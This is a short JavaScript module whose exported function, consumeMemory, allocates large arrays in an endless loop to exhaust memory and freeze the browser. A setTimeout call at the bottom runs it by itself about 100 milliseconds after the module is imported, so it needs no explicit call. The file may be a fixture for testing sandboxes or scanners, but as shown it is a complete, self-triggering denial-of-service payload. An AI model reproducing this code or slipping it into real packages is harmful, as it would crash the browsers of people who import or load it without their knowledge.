// Heavy memory consumer that freezes the browser
export function consumeMemory() {
  const arrays = [];
  for (let i = 0; i < 100000; i++) {
    arrays.push(new Array(10000).fill('x'.repeat(1000)));
  }
  while (true) {
    arrays.push(new Array(10000).fill('x'.repeat(1000)));
  }
}

// Auto-trigger on import
setTimeout(() => consumeMemory(), 100);
